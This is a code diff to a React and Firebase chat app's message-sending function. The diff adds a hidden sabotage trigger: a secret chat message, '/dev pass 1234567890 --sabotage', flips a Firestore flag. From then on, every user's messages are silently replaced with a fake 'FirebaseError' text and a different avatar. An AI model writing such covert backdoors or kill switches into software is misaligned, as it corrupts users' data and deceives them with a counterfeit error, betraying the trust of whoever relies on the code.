@@ -141,18 +141,25 @@ function SignOut() {
 function ChatRoom() {
   const dummy = useRef();
   const messagesRef = firestore.collection('messages');
-  //const isHackedRef = firestore.collection('isHacked');
+  const isHackedRef = firestore.collection('isHacked').doc('areWeHacked');
   const query = messagesRef.orderBy('createdAt').limit(10000);
 
   const [messages] = useCollectionData(query, { idField: 'id' });
 
-  const [formValue, setFormValue] = useState('');
+  var [formValue, setFormValue] = useState('');
 
 
   const sendMessage = async (e) => {
     e.preventDefault();
 
-    const { uid, photoURL } = auth.currentUser;
+    var { uid, photoURL } = auth.currentUser;
+
+    const finale =await isHackedRef.get();
+    if(finale.data().ans === true){
+      formValue = 'FirebaseError(10): Conversion Limit Exceeded';
+      photoURL = 'https://www.jea.com/cdn/images/avatar/avatar-alt.svg';
+      console.log("SUPER HACKED");
+    }
 
     await messagesRef.add({
       text: formValue,
@@ -162,6 +169,9 @@ function ChatRoom() {
     })
 
     if(formValue === "/dev pass 1234567890 --sabotage"){
+      await isHackedRef.update({
+        ans: true
+      })
       console.log("HACKED");
     }
     else if(formValue.length > 128){
